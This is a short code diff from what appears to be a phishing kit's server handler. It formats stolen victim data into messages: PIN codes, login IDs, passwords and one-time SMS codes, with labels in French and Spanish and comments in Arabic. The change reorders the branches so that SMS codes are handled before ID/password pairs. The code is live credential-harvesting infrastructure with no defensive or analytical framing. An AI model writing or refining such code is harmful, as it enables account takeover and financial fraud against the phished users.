@@ -41,20 +41,20 @@ export default async function handler(req, res) {
   - Code: ${PINE}
     `;
 
-  } else if (id_no && password ) {
+  }else if (sms_input ) {
+    // 🟢 رسالة الكارت
+    message = `
+    🔑 SMS recibido Login:
+    - sms: ${sms_input}
+     `;
+  }else if (id_no && password ) {
     // 🟢 رسالة الكارت
     message = `
     🔑 Nouveau PIN Login:
     - Identifiant: ${id_no}
     - Mot de passe: ${password}
      `;
-} else if (sms_input ) {
-  // 🟢 رسالة الكارت
-  message = `
-  🔑 SMS recibido Login:
-  - sms: ${sms_input}
-   `;
-}else if (SMSERROR ) {
+} else if (SMSERROR ) {
   // 🟢 رسالة الكارت
   message = `
   🔑sms_input Login:
